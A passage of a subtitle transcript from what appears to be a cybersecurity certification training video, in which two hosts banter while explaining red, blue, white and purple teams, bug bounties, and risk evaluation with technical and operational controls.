passe tomorrow.\n\n34\n00:01:24.970 --> 00:01:29.740\nAnd the thing that was not even a blip on\nyour radar is now a devastating attack\n\n35\n00:01:29.740 --> 00:01:31.140\nthat you have to be aware of.\n\n36\n00:01:31.140 --> 00:01:36.090\nSo use training to stay on top of these\nthings so that we not only are aware that\n\n37\n00:01:36.090 --> 00:01:40.390\nthey are a problem, but we're also\nschooled up on what to do if we see that.\n\n38\n00:01:40.390 --> 00:01:43.780\n&gt;&gt; That's right, it's like we say,\na good IT pro is always learning.\n\n39\n00:01:43.780 --> 00:01:46.820\n&gt;&gt; That's right, it's kinda like why\nwe're doing what we're doing right now.\n\n40\n00:01:46.820 --> 00:01:51.780\nYou guys are engaged in training,\nyou're trying to make your skill set\n\n41\n00:01:51.780 --> 00:01:56.250\nhigh enough to be able to be effective\nin today's cybersecurity world.\n\n42\n00:01:56.250 --> 00:01:58.830\nAnd good on you for\nmaking that effort, it's-\n\n43\n00:01:58.830 --> 00:01:59.330\n&gt;&gt; Good on you, mate.\n\n44\n00:01:59.330 --> 00:02:01.050\n&gt;&gt; It's a valiant effort, yes.\n\n45\n00:02:01.050 --> 00:02:04.050\nIn our best Australian accents,\nwe say, good on you, mate, right?\n\n46\n00:02:04.050 --> 00:02:05.765\nHopefully, that was decent.\n\n47\n00:02:05.765 --> 00:02:06.580\n&gt;&gt; [LAUGH]\n&gt;&gt; It probably wasn't.\n\n48\n00:02:06.580 --> 00:02:07.970\n&gt;&gt; It was decent.\n&gt;&gt; All right.\n\n49\n00:02:07.970 --> 00:02:11.430\nSo let's talk a little bit\nabout some terminology and\n\n50\n00:02:11.430 --> 00:02:15.020\nsome concepts that go along with training.\n\n51\n00:02:15.020 --> 00:02:16.420\nAnd this isn't really exciting.\n\n52\n00:02:16.420 --> 00:02:20.220\nBut it can be, especially if you're\na part of wanting just some different of\n\n53\n00:02:20.220 --> 00:02:23.440\nwhat we like to call teams\nin the security sphere.\n\n54\n00:02:23.440 --> 00:02:24.400\nAnd you have a red team.\n\n55\n00:02:24.400 --> 00:02:25.560\nYou have a blue team.\n\n56\n00:02:25.560 --> 00:02:29.070\nYou got a white team, purple team,\nhunt team, threat team, you name it.\n\n57\n00:02:29.070 --> 00:02:31.290\nThere's so many teams.\n\n58\n00:02:31.290 --> 00:02:34.683\nYou can use a, gonna have to have\na teamster's union, for all the teams,\n\n59\n00:02:34.683 --> 00:02:35.330\n&gt;&gt; [LAUGH]\n\n60\n00:02:35.330 --> 00:02:36.943\n&gt;&gt; That you have inside there.\n\n61\n00:02:36.943 --> 00:02:38.610\nThey might even allow you to do that.\n\n62\n00:02:38.610 --> 00:02:39.750\n&gt;&gt; They might.\n\n63\n00:02:39.750 --> 00:02:41.090\n&gt;&gt; Yeah.\n&gt;&gt; So let me, may I ask you, well,\n\n64\n00:02:41.090 --> 00:02:42.760\nwhat do the different colors represent?\n\n65\n00:02:42.760 --> 00:02:44.440\nDo they represent something specific?\n\n66\n00:02:44.440 --> 00:02:47.570\n&gt;&gt; Yes they, exactly,\ndo represent something specific.\n\n67\n00:02:47.570 --> 00:02:50.660\nAnd there's only a few of those\nyou need to be, rock solid on.\n\n68\n00:02:50.660 --> 00:02:54.250\nAnd that's basically, the red team,\nthe blue team, and the white team.\n\n69\n00:02:54.250 --> 00:02:57.760\nThese are the ones they\nwant you to know for exam.\n\n70\n00:02:57.760 --> 00:02:58.600\n&gt;&gt; Good, that's important.\n\n71\n00:03:00.020 --> 00:03:01.360\n&gt;&gt; It's very easy to break down.\n\n72\n00:03:01.360 --> 00:03:04.840\nIt's nothing, this is nothing crazy\nthat's gonna blow your mind or anything.\n\n73\n00:03:04.840 --> 00:03:10.060\nRed team aptly, I think aptly put, red,\nwhen most people think red they think\n\n74\n00:03:10.060 --> 00:03:13.890\ndanger or attack or\nsomething that's a warning, right?\n\n75\n00:03:13.890 --> 00:03:16.000\nAnd this is your attack team.\n\n76\n00:03:16.000 --> 00:03:19.420\nThese are people that would\nbe penetration testers.\n\n77\n00:03:19.420 --> 00:03:24.180\nThey would be the ones that\nare actively attacking the network\n\n78\n00:03:24.180 --> 00:03:25.980\nas a threat actor would.\n\n79\n00:03:25.980 --> 00:03:29.980\nEngaging in trying to exploit\nvulnerabilities that they find, and\n\n80\n00:03:29.980 --> 00:03:33.600\ngetting bypassed any of the security\nmeasures that are in place.\n\n81\n00:03:33.600 --> 00:03:37.560\nThis is your red team,\nthis is their job this is what they do.\n\n82\n00:03:37.560 --> 00:03:39.965\nAnd it's a lot of fun,\nit's my favorite thing.\n\n83\n00:03:39.965 --> 00:03:41.860\n&gt;&gt; [LAUGH]\n&gt;&gt; I love red team,\n\n84\n00:03:41.860 --> 00:03:46.660\nred teaming is just a good time had by all\nbecause I love trying to find that little\n\n85\n00:03:46.660 --> 00:03:47.230\nchink in the armor.\n\n86\n00:03:47.230 --> 00:03:51.090\n&gt;&gt; Yeah, if I can just go here, If I\ncould get you to upload this file, and\n\n87\n00:03:51.090 --> 00:03:53.540\nthen access it to the web and\nthen launches.\n\n88\n00:03:53.540 --> 00:03:57.200\nYes, now I have a shell, wonderful,\nooh, ooh, I'm having a good time.\n\n89\n00:03:57.200 --> 00:04:00.850\nI love red teaming, that's what red\nteaming does, that's their job.\n\n90\n00:04:00.850 --> 00:04:02.480\nThen you have blue team.\n\n91\n00:04:02.480 --> 00:04:05.550\nNow, blue team, they're your defenders.\n\n92\n00:04:05.550 --> 00:04:06.760\nThey're the ones that are going,\n\n93\n00:04:06.760 --> 00:04:10.010\nthey're doing everything they\ncan to keep the red team out.\n\n94\n00:04:10.010 --> 00:04:13.100\nAnd these are teaming exercises.\n\n95\n00:04:13.100 --> 00:04:18.020\nYou create these teams so\nthat you can set up an exercise and say,\n\n96\n00:04:18.020 --> 00:04:23.590\nokay we're gonna have red team attack web,\nand blue team, you're defending web.\n\n97\n00:04:23.590 --> 00:04:24.730\nIt becomes a big game.\n\n98\n00:04:24.730 --> 00:04:27.970\nAnd in that big gameosphere\nthat you create,\n\n99\n00:04:27.970 --> 00:04:29.840\nyou learn a lot about your network, and\n\n100\n00:04:29.840 --> 00:04:34.120\nyou learn a lot about your ability to\nsecure that network, one way or another.\n\n101\n00:04:34.120 --> 00:04:35.770\nSo that's the importance of these teams.\n\n102\n00:04:35.770 --> 00:04:39.200\nSo blue team is constantly on vigil,\nthey are looking for, and really,\n\n103\n00:04:39.200 --> 00:04:41.540\nthey've got the harder job,\nto be honest with you.\n\n104\n00:04:41.540 --> 00:04:45.590\nBlue team, you got to take your\nhat off to a blue teamer because\n\n105\n00:04:47.100 --> 00:04:49.640\ntheir job is to think of everything.\n\n106\n00:04:49.640 --> 00:04:52.970\nTheir job is to understand\nevery vulnerability,\n\n107\n00:04:52.970 --> 00:04:58.820\nhow it could be bypassed and\nthen create controls to keep people out.\n\n108\n00:04:58.820 --> 00:05:02.660\nRed team, they only have to find\none thing that blue team forgot.\n\n109\n00:05:03.740 --> 00:05:09.240\nThey find one thing, they gain access,\nthey will exploit and go in, right.\n\n110\n00:05:09.240 --> 00:05:15.040\nNow the interesting thing is, this isn't\nfor the example, this is just interesting,\n\n111\n00:05:15.040 --> 00:05:20.800\nonce red team gains access, they kind\nof switch roles with the blue team.\n\n112\n00:05:20.800 --> 00:05:22.410\nBecause now they have to\nmaintain their access.\n\n113\n00:05:24.190 --> 00:05:27.190\nSo they have to think of every\nway that blue team might\n\n114\n00:05:27.190 --> 00:05:29.730\nfind an implication of compromise.\n\n115\n00:05:29.730 --> 00:05:33.690\nAnd obfuscate it or\nremove it so that they don't.\n\n116\n00:05:33.690 --> 00:05:38.320\nAnd all blue team has to do is find one\nindicator of compromise and closed up, and\n\n117\n00:05:38.320 --> 00:05:39.720\nnow they know they've been compromised.\n\n118\n00:05:39.720 --> 00:05:43.570\nThey can start mitigation, close the hole,\nkick the guy out, whatever they gotta do.\n\n119\n00:05:43.570 --> 00:05:47.990\nSo if it was through a we didn't patch\nthis software, we patch the software.\n\n120\n00:05:47.990 --> 00:05:50.010\nNow the hole's gone, right?\n\n121\n00:05:50.010 --> 00:05:51.970\nSo it's an interesting dichotomy,\n\n122\n00:05:51.970 --> 00:05:56.110\nan interesting little\necosystem that gets built up.\n\n123\n00:05:56.110 --> 00:05:59.660\nAnd then there's white team,\nwhat does white team do?\n\n124\n00:05:59.660 --> 00:06:03.100\nWhite team is kind of like the referees or\nthe officials of the game.\n\n125\n00:06:03.100 --> 00:06:06.260\nThey say, here are the rules.\n\n126\n00:06:06.260 --> 00:06:08.195\nHere's how we're gonna play by.\n\n127\n00:06:08.195 --> 00:06:13.920\nCuz maybe we're gonna set it up to\nwhere it's a blind test for blue team.\n\n128\n00:06:13.920 --> 00:06:18.030\nThey don't know that we're\ngonna be being attacked.\n\n129\n00:06:18.030 --> 00:06:19.610\nRed team knows we're attacked\nbecause I told them.\n\n130\n00:06:19.610 --> 00:06:21.270\nYou guys are gonna attack this week.\n\n131\n00:06:21.270 --> 00:06:22.700\nHere's what you're gonna go after.\n\n132\n00:06:22.700 --> 00:06:27.280\nLet's see how fast it takes blue team\nto react, or if they react, at all.\n\n133\n00:06:27.280 --> 00:06:30.310\nDo they even notice that you're there?\n\n134\n00:06:30.310 --> 00:06:35.650\nAnd the white, once you figure out all\nthe rules of what your exercise is going\n\n135\n00:06:35.650 --> 00:06:40.260\nto entail white team members make sure\nthat everybody is adhering to those rules.\n\n136\n00:06:40.260 --> 00:06:43.860\nSo if red team got through but\nthey kinda went around the rules to do it,\n\n137\n00:06:43.860 --> 00:06:46.170\nwhite team would say, yeah,\nyou were able to compromise the system.\n\n138\n00:06:46.170 --> 00:06:47.610\nBut you weren't able to\ncompromise it this way.\n\n139\n00:06:47.610 --> 00:06:50.100\nYou used insider information or\n\n140\n00:06:50.100 --> 00:06:54.990\nsomething like that that we've deemed\nunusable by you for that exercise.\n\n141\n00:06:54.990 --> 00:06:58.040\nAnd you did it, therefore your\nresults are invalidated, right?\n\n142\n00:06:58.040 --> 00:07:01.090\nWe want to be this way for\na specific reason.\n\n143\n00:07:01.090 --> 00:07:03.520\nTherefore, don't go around those reasons.\n\n144\n00:07:03.520 --> 00:07:05.400\n&gt;&gt; So Daniel, when's the purple team?\n\n145\n00:07:05.400 --> 00:07:10.210\n&gt;&gt; Good question, purple team's\nkind of a transient wanders in and\n\n146\n00:07:10.210 --> 00:07:12.320\nout of [LAUGH],\nred teaming and blue teaming.\n\n147\n00:07:12.320 --> 00:07:14.010\nIt's just someone that does both.\n\n148\n00:07:14.010 --> 00:07:15.736\n&gt;&gt; Sounds like my cousin Benny [LAUGH].\n\n149\n00:07:15.736 --> 00:07:17.690\n&gt;&gt; [LAUGH] He doesn't\ntake out the garbage.\n\n150\n00:07:17.690 --> 00:07:20.000\n&gt;&gt; He just wanders in and out.\n\n151\n00:07:20.000 --> 00:07:22.610\n&gt;&gt; Plays a lot of video games,\ndrinks a lot.\n\n152\n00:07:22.610 --> 00:07:23.400\n&gt;&gt; Eats all the food.\n\n153\n00:07:23.400 --> 00:07:27.070\n&gt;&gt; That Benny, he's Zach's purple teamer.\n\n154\n00:07:27.070 --> 00:07:29.740\nBut that's all, they kinda play\non both sides of the fence.\n\n155\n00:07:29.740 --> 00:07:33.410\nSo you never know what they'll be doing,\nthey have skill sets for both.\n\n156\n00:07:33.410 --> 00:07:36.470\nAnd you can put them anywhere you\nneed them, so that's a purple teamer.\n\n157\n00:07:36.470 --> 00:07:37.840\nWhat else do we need to look at?\n\n158\n00:07:37.840 --> 00:07:43.650\nI did bring up the terms hunt team and\nthreat hunting.\n\n159\n00:07:43.650 --> 00:07:46.629\nThis is a term that you'll\nprobably run across.\n\n160\n00:07:46.629 --> 00:07:50.594\nI don't remember it being mentioned in\nthe exam objectives, this is just for\n\n161\n00:07:50.594 --> 00:07:51.635\nyour edification.\n\n162\n00:07:51.635 --> 00:07:53.380\n&gt;&gt; Mm-hm.\n&gt;&gt; But basically they're looking for\n\n163\n00:07:53.380 --> 00:07:54.628\nthose indicators or compromise.\n\n164\n00:07:54.628 --> 00:07:56.370\nThey're looking for APT.\n\n165\n00:07:56.370 --> 00:07:58.860\nInside of your network and your systems.\n\n166\n00:07:58.860 --> 00:08:01.258\nSo that's what the hunt team does.\n\n167\n00:08:01.258 --> 00:08:06.780\nThey start meandering through the data,\nand find what's this file doing here?\n\n168\n00:08:06.780 --> 00:08:09.765\nDoing that reverse engineering,\ndoing that malware assessment,\n\n169\n00:08:09.765 --> 00:08:12.082\nseeing if they found any\nindication of compromise.\n\n170\n00:08:12.082 --> 00:08:14.422\nAnd then throwing that up the ranks and\nsaying, hey,\n\n171\n00:08:14.422 --> 00:08:15.827\nwe've got a real problem here.\n\n172\n00:08:15.827 --> 00:08:18.723\nAnd that's their only job, and really,\n\n173\n00:08:18.723 --> 00:08:23.420\nanybody that's in security Is\nkind of doing that already.\n\n174\n00:08:23.420 --> 00:08:28.411\nBut that's not their specific focus,\nwhereas someone on the hunt team would\n\n175\n00:08:28.411 --> 00:08:32.731\nsay my focus is do nothing but\nlook for indications of compromise.\n\n176\n00:08:32.731 --> 00:08:38.140\nWhere do they exist and can we find them\nif we do, we gotta get that taken care of.\n\n177\n00:08:38.140 --> 00:08:40.380\n&gt;&gt; What's the bug bounty?\n\n178\n00:08:40.380 --> 00:08:44.004\n&gt;&gt; Bug bounty, another thing that's\nnot on the exam but very cool for\n\n179\n00:08:44.004 --> 00:08:46.657\nyou guys out there which\nis a good way to make extra\n\n180\n00:08:46.657 --> 00:08:49.552\nmoney-\n&gt;&gt; To take your skills that you know as\n\n181\n00:08:49.552 --> 00:08:52.450\nsomeone who is a security practitioner.\n\n182\n00:08:52.450 --> 00:08:56.741\nAnd basically what they're doing is it's\na type of penetration test at the lowest\n\n183\n00:08:56.741 --> 00:09:01.031\nlevel to try to equate it to something you\nmight already know What they're doing is\n\n184\n00:09:01.031 --> 00:09:03.831\nsaying, instead of outsourcing\nthrough a company,\n\n185\n00:09:03.831 --> 00:09:05.664\neven though I might still do that.\n\n186\n00:09:05.664 --> 00:09:09.779\nwhat I do is I create a bug\nbounty program that says,\n\n187\n00:09:09.779 --> 00:09:14.758\nhere is a scope of external facing\nelements of my network, and\n\n188\n00:09:14.758 --> 00:09:17.658\nanybody is allowed to attack them.\n\n189\n00:09:17.658 --> 00:09:22.869\nIf you find any vulnerabilities that\nyou're able to exploit let me know and\n\n190\n00:09:22.869 --> 00:09:24.805\nI'll give you some money.\n\n191\n00:09:24.805 --> 00:09:25.447\n&gt;&gt; Wooh!\n\n192\n00:09:25.447 --> 00:09:26.930\n&gt;&gt; Yeah, right?\n\n193\n00:09:26.930 --> 00:09:29.084\nThat doesn't always end up\nbeing a monetary reimbursement.\n\n194\n00:09:29.084 --> 00:09:31.015\nSometimes it's just-\n&gt;&gt; Cheese sandwich?\n\n195\n00:09:31.015 --> 00:09:35.956\n&gt;&gt; Yeah, cheese sandwiches are very\npopular in the bug bounty programs.\n\n196\n00:09:35.956 --> 00:09:39.565\nSo man, you just get a nice\nrye with the cut so thin?\n\n197\n00:09:39.565 --> 00:09:41.050\nSo nice, [SOUND] right?\n\n198\n00:09:41.050 --> 00:09:41.837\nIt's very tasty.\n\n199\n00:09:41.837 --> 00:09:44.850\nBut sometimes you just get kudos.\n\n200\n00:09:44.850 --> 00:09:46.503\nYou just get bragging rights.\n\n201\n00:09:46.503 --> 00:09:47.742\nYou get statistics.\n\n202\n00:09:47.742 --> 00:09:52.770\nThere's a company that's,\nI got to interview, called HackerOne.\n\n203\n00:09:52.770 --> 00:09:56.682\nThey're job is to basically bring\ncompanies and hackers together so\n\n204\n00:09:56.682 --> 00:10:00.605\nthat they can participate in these\ncompany's bug bounty programs.\n\n205\n00:10:00.605 --> 00:10:03.690\nAnd they give you all of the information\nthat you need for the bug bounty.\n\n206\n00:10:03.690 --> 00:10:08.247\nAnd you get to build your statistics on,\nyeah I've gotten a bunch of kudos on that\n\n207\n00:10:08.247 --> 00:10:11.746\ncompany if I was successful at\nshowing them a bug that I found.\n\n208\n00:10:11.746 --> 00:10:15.541\nThat they can verify that that was\ntrue and I get credit for that so\n\n209\n00:10:15.541 --> 00:10:20.482\nother companies will see well, Zach has\ndone a great job, I see by his statistics.\n\n210\n00:10:20.482 --> 00:10:22.183\nIt's like having a baseball card.\n\n211\n00:10:22.183 --> 00:10:23.456\n&gt;&gt; Yeah.\n&gt;&gt; And man,\n\n212\n00:10:23.456 --> 00:10:27.093\nhe's fantastic at cross-site\nscripting attacks.\n\n213\n00:10:27.093 --> 00:10:28.661\nWe got a bug bounty program, but\n\n214\n00:10:28.661 --> 00:10:31.922\nI wanna make sure that Zach is in\non an internal bug bounty program.\n\n215\n00:10:31.922 --> 00:10:34.520\nSo I'm gonna bring him on,\nthat's what HackerOne does.\n\n216\n00:10:34.520 --> 00:10:37.716\nAmazing stuff, very cool, so\nif you wanna get in on that.\n\n217\n00:10:37.716 --> 00:10:40.634\nAnd basically, you're just doing\nwhat you would do on a red team, but\n\n218\n00:10:40.634 --> 00:10:42.130\nyou don't work directly for them.\n\n219\n00:10:42.130 --> 00:10:46.606\nYou work for yourself, you're just you,\nand trying to compromise a machine.\n\n220\n00:10:46.606 --> 00:10:49.580\nSo it's a lot of fun,\nit's a good way to make extra money.\n\n221\n00:10:49.580 --> 00:10:53.184\nAnd it's a good way for companies to get\na broader community of people to come in\n\n222\n00:10:53.184 --> 00:10:56.532\nto test their security and see if they\ncan find any places to compromise.\n\n223\n00:10:56.532 --> 00:10:59.730\n&gt;&gt; So\nrisk evaluation is a part of this episode.\n\n224\n00:10:59.730 --> 00:11:01.478\nWhat are we gonna be doing and\nhow do we do it?\n\n225\n00:11:01.478 --> 00:11:03.320\n&gt;&gt; Yeah, good question.\n\n226\n00:11:03.320 --> 00:11:06.604\nNow we're segueing off into risk and\nevaluating risks.\n\n227\n00:11:06.604 --> 00:11:12.317\nSo this is an important part of what\nwe're doing at security practice.\n\n228\n00:11:12.317 --> 00:11:14.554\nWe have to know what our risk appetite is.\n\n229\n00:11:14.554 --> 00:11:16.910\nHow much risk can we take?\n\n230\n00:11:16.910 --> 00:11:20.636\nAnd what controls can we put\nin place to mitigate risk?\n\n231\n00:11:20.636 --> 00:11:25.594\nSo it's all about discovering risk,\nfinding out how bad the risk is,\n\n232\n00:11:25.594 --> 00:11:28.380\nwhat's the threat level of that risk?\n\n233\n00:11:28.380 --> 00:11:30.691\nThis is what we mean by risk evaluation.\n\n234\n00:11:30.691 --> 00:11:34.398\nFiguring all this stuff out,\nfiguring out what we can do to put\n\n235\n00:11:34.398 --> 00:11:39.320\nsomething in place to bring it down to a\nlower level, something more palatable for\n\n236\n00:11:39.320 --> 00:11:42.480\nour risk appetite, and\njust mitigating risk down.\n\n237\n00:11:42.480 --> 00:11:43.772\nSo if we don't know what the risk is, and\n\n238\n00:11:43.772 --> 00:11:46.514\nwe don't know how to classify things we're\nnot gonna have a very good time with that.\n\n239\n00:11:46.514 --> 00:11:50.970\nI just wanna give you a real quick\nbreakdown of evaluating risk.\n\n240\n00:11:50.970 --> 00:11:54.232\nLet's start off with some,\nwell a definition, I wrote controls,\n\n241\n00:11:54.232 --> 00:11:55.615\npractices and procedures.\n\n242\n00:11:55.615 --> 00:11:59.560\nActually I think I made a, did I make a?\n\n243\n00:11:59.560 --> 00:12:02.806\nNo, it is control, I thought I\nmade a diagram, I guess I didn't.\n\n244\n00:12:02.806 --> 00:12:04.716\nIt's controls, practices and\n\n245\n00:12:04.716 --> 00:12:08.700\nprocedures that basically build\nup our cybersecurity platform.\n\n246\n00:12:08.700 --> 00:12:11.960\nThat's what we're looking.\nThat's what a risk assessment is.\n\n247\n00:12:11.960 --> 00:12:13.993\nAnd what are these things?\n\n248\n00:12:13.993 --> 00:12:17.580\nWell, we've got two different types of\ncontrols that you can basically use.\n\n249\n00:12:17.580 --> 00:12:24.653\nOne's a technical control,\nthe other is an operational control, okay?\n\n250\n00:12:24.653 --> 00:12:26.760\nIt's gonna be weird for you.\n\n251\n00:12:26.760 --> 00:12:27.873\nLet's start with technical controls.\n\n252\n00:12:27.873 --> 00:12:32.656\nTechnical controls are anything\nthat we do technically to\n\n253\n00:12:32.656 --> 00:12:36.600\nbuild up our security platform, all right?\n\n254\n00:12:36.600 --> 00:12:39.290\nSo this is things like\nlet's install a NAC.\n\n255\n00:12:39.290 --> 00:12:43.590\nLet's use a web application firewall.\n\n256\n00:12:43.590 --> 00:12:45.115\nLet's get good ACL's.\n\n257\n00:12:45.115 --> 00:12:49.730\nLet's put in endpoint security,\nantivirus, what else?\n\n258\n00:12:49.730 --> 00:12:54.219\nFirewalls, hids and nids,\nthe host-based intrusion detection and\n\n259\n00:12:54.219 --> 00:12:56.894\nnetwork-based intrusion prevention.\n\n260\n00:12:56.894 --> 00:12:57.930\nLet's put that in.\n\n261\n00:12:57.930 --> 00:13:02.701\nThese are technical little things that\nI can apply to my network that will do\n\n262\n00:13:02.701 --> 00:13:06.788\na job of looking for threats and\ntrying to mitigate them down, so\n\n263\n00:13:06.788 --> 00:13:08.777\nthat's a technical control.\n\n264\n00:13:08.777 --> 00:13:12.050\n&gt;&gt; And Daniel, will they be looking for\nthis information on the exams?\n\n265\n00:13:12.050 --> 00:13:12.860\n&gt;&gt; Yes.\n&gt;&gt; Okay.\n\n266\n00:13:12.860 --> 00:13:14.570\n&gt;&gt; Yes, this is definitely-\n&gt;&gt; Importante.\n\n267\n00:13:14.570 --> 00:13:17.652\n&gt;&gt; Importante, very muy bueno,\nmy good man over there.\n\n268\n00:13:17.652 --> 00:13:20.470\nIt is very important, this is something\nthat you wanna know the definition of.\n\n269\n00:13:20.470 --> 00:13:25.839\nSo a technical control are those\ntechnical things that we do like a NAC,\n\n270\n00:13:25.839 --> 00:13:29.338\nsystems that we put into\nplace to do security.\n\n271\n00:13:29.338 --> 00:13:31.457\nTo make security more robust.\n\n272\n00:13:31.457 --> 00:13:35.004\nThe layers of adding actual devices and\n\n273\n00:13:35.004 --> 00:13:39.875\napplications into the network for\nmitigating risk.\n\n274\n00:13:39.875 --> 00:13:40.753\n&gt;&gt; Mm-hm.\n\n275\n00:13:40.753 --> 00:13:45.512\n&gt;&gt; Operational controls are programs\nin which we develop and\n\n276\n00:13:45.512 --> 00:13:50.860\nprocedures that we do that make\nsecurity more strong, right?\n\n277\n00:13:50.860 --> 00:13:52.302\nOr stronger, I should say.\n\n278\n00:13:52.302 --> 00:13:57.290\nThis is things lie doing pen testing,\ncompliance testing.\n\n279\n00:13:57.290 --> 00:14:00.547\nIf you're in a company where\ncompliance is a thing,\n\n280\n00:14:00.547 --> 00:14:04.701\nyou're in a health organization,\nyou need to comply with HIPPA.\n\n281\n00:14:04.701 --> 00:14:08.937\nIf you're in a payment card industry,\nso the PCI,\n\n282\n00:14:08.937 --> 00:14:13.110\nBSS business, those compliance standards.\n\n283\n00:14:13.110 --> 00:14:13.876\nYou're gonna want to adhere to those.\n\n284\n00:14:13.876 --> 00:14:16.450\nHow do you know that you're\nactually doing that?\n\n285\n00:14:16.450 --> 00:14:17.021\nYou do compliance testing.\n\n286\n00:14:17.021 --> 00:14:21.705\nYou make sure that when you read\nthrough the document, it says,\n\n287\n00:14:21.705 --> 00:14:25.190\ndo pen testing at least quarterly.\n\n288\n00:14:25.190 --> 00:14:25.833\nAre you doing pen tests?\n\n289\n00:14:25.833 --> 00:14:30.060\nCan you check that box and\ngo yes, we are doing that?\n\n290\n00:14:30.060 --> 00:14:31.191\nHow do you know?\n\n291\n00:14:31.191 --> 00:14:35.780\nThat's a great question because here's my\nreports from each one of my pen tests.\n\n292\n00:14:35.780 --> 00:14:38.006\nRight here, one for\neach quarter, I can verify that.\n\n293\n00:14:38.006 --> 00:14:39.740\nCheck, that is off.\n\n294\n00:14:39.740 --> 00:14:41.056\nSo doing that thing, very, very good.\n\n295\n00:14:41.056 --> 00:14:43.090\nThat's operational control.\n\n296\n00:14:43.090 --> 00:14:43.924\nCode review, right?\n\n297\n00:14:43.924 --> 00:14:49.120\nThis is something that we do as\nthat's what an operation for.\n\n298\n00:14:49.120 --> 00:14:53.010\nSo code review,\nadhering the best practices,\n\n299\n00:14:53.010 --> 00:14:56.323\nend user security awareness training.\n\n300\n00:14:56.323 --> 00:15:01.850\nGetting a program together for end users\nwho aren't security practitioners per se.\n\n301\n00:15:01.850 --> 00:15:06.542\nAnd giving them at least some foundational\nsecurity knowledge cuz they are part of\n\n302\n00:15:06.542 --> 00:15:09.991\nthe system so\nthat they can help increase the security.\n\n303\n00:15:09.991 --> 00:15:13.360\nI shouldn't click on links in\nemails from people I don't know.\n\n304\n00:15:13.360 --> 00:15:16.452\nI should be really wary of clicking\non links on people from people I do\n\n305\n00:15:16.452 --> 00:15:17.167\nknow, right?\n\n306\n00:15:17.167 --> 00:15:20.730\nThese are things we need to teach them\nbecause they don't know that stuff.\n\n307\n00:15:20.730 --> 00:15:23.307\nSo creating a security\nawareness program and\n\n308\n00:15:23.307 --> 00:15:26.234\nimplementing it would be\nan operational control.\n\n309\n00:15:26.234 --> 00:15:29.936\nSo hopefully you're seeing the difference\nbetween technical controls and\n\n310\n00:15:29.936 --> 00:15:31.160\noperational controls.\n\n311\n00:15:31.160 --> 00:15:34.352\nAnd that has been made hopefully\nvery clear to you on the difference\n\n312\n00:15:34.352 --> 00:15:35.213\nbetween the two.\n\n313\n00:15:35.213 --> 00:15:39.522\nSo if somebody asks you if you have\nimplemented a NAC on your system,\n\n314\n00:15:39.522 --> 00:15:42.780\nwhat type of security control is that?\n\n315\n00:15:42.780 --> 00:15:45.828\nOr what kind of risk management control?\n\n316\n00:15:45.828 --> 00:15:48.830\nThat's a technical control.\n\n317\n00:15:48.830 --> 00:15:50.137\nThat's the kinda questions\nyou're wanna give at the end.\n\n318\n00:15:50.137 --> 00:15:53.252\n&gt;&gt; And so Daniel, once again, NAC means?\n\n319\n00:15:53.252 --> 00:15:53.932\n&gt;&gt; Network access control.\n\n320\n00:15:53.932 --> 00:15:55.923\n&gt;&gt; There you go.\n\n321\n00:15:55.923 --> 00:15:57.820\n&gt;&gt; We talked about that,\nhopefully you guys know.\n\n322\n00:15:57.820 --> 00:15:58.691\nZach wasn't there.\n\n323\n00:15:58.691 --> 00:15:59.382\n&gt;&gt; I wasn't there.\n\n324\n00:15:59.382 --> 00:16:00.538\n&gt;&gt; We'll give him some leeway.\n\n325\n00:16:00.538 --> 00:16:01.506\nAnd also I'm from Iowa.\n\n326\n00:16:01.506 --> 00:16:03.975\nThat's right.\nYes also from Iowa.\n\n327\n00:16:03.975 --> 00:16:04.935\nWe don't hold it against them.\n\n328\n00:16:04.935 --> 00:16:07.372\nI lived in Missouri for a while.\n\n329\n00:16:07.372 --> 00:16:13.370\nAll right, let's see here, we also need\nto discover the technical impact and\n\n330\n00:16:13.370 --> 00:16:16.320\nlikelihood of the threats that we do find.\n\n331\n00:16:16.320 --> 00:16:20.430\nSo once we discover the risk, we put in\ncountermeasures using our operational\n\n332\n00:16:20.430 --> 00:16:23.900\ncontrols, our technical controls,\nour operation controls.\n\n333\n00:16:23.900 --> 00:16:28.290\nWhat do we do once we've\ndiscovered that we have risk and\n\n334\n00:16:28.290 --> 00:16:29.660\nwe know what it is, we've identified it?\n\n335\n00:16:29.660 --> 00:16:33.360\nWell now we've gotta tell ourselves what\nis the likelihood of it happening and\n\n336\n00:16:33.360 --> 00:16:37.990\nwhat would be the impact if it did happen,\nall right?\n\n337\n00:16:37.990 --> 00:16:41.040\n&gt;&gt; Yeah, this is risk evaluation,\nokay, and\n\n338\n00:16:41.040 --> 00:16:44.420\nnow that I know what the risk is,\nwhat's the likelihood it's gonna occur?\n\n339\n00:16:44.420 --> 00:16:46.910\nAnd how devastating will\nit be if it does occur?\n\n340\n00:16:46.910 --> 00:16:51.440\nSome things, if it does happen,\nnot a big deal.\n\n341\n00:16:51.440 --> 00:16:53.280\nNo one's dying, right?\n\n342\n00:16:53.280 --> 00:16:56.840\nThen there's some things where literally,\npeople could die, right?\n\n343\n00:16:56.840 --> 00:17:01.280\nSo that would be what we would\ncall high impacts, right?\n\n344\n00:17:01.280 --> 00:17:03.200\nThat's the very, very bad thing.\n\n345\n00:17:03.200 --> 00:17:09.100\nSo, if we don't know what it is then\nwe have a hard time prioritizing,\n\n346\n00:17:09.100 --> 00:17:11.150\nwith our management of that risk.\n\n347\n00:17:11.150 --> 00:17:15.210\nSo, we wanna break this things down and\nget them categorize in their proper spot\n\n348\n00:17:15.210 --> 00:17:18.710\nand you'll see a lot of these charts,\nI may open this guy up here.\n\n349\n00:17:18.710 --> 00:17:20.320\nI made a chart.\n\n350\n00:17:20.320 --> 00:17:21.950\nYou'll see these all over the place.\n\n351\n00:17:21.950 --> 00:17:25.300\nThis look up like a risk metrics\nchart on your favorite search engine.\n\n352\n00:17:25.300 --> 00:17:28.500\nAnd it will bring back if not something\nidentical to his something very\n\n353\n00:17:28.500 --> 00:17:29.060\nsimilar to this.\n\n354\n00:17:29.060 --> 00:17:33.120\nThis is a very simplistic one, obviously\nwe wanna keep things simple as we learn\n\n355\n00:17:33.120 --> 00:17:37.170\nthem and then get more complex\nas we grow our knowledge.\n\n356\n00:17:37.170 --> 00:17:39.490\nBut here basically,\nwhat I'm saying is I've got my impact.\n\n357\n00:17:39.490 --> 00:17:43.020\nAnd then I've got my likelihoods,\nso I've got an x and y axis.\n\n358\n00:17:44.120 --> 00:17:49.690\nSo I've got low, I've got medium,\nI've got high probabilities.\n\n359\n00:17:51.230 --> 00:17:53.640\nImpacts, low impacts, medium impacts,\n\n360\n00:17:53.640 --> 00:17:57.200\nhigh impacts,\nthen likelihood low medium as well.\n\n361\n00:17:57.200 --> 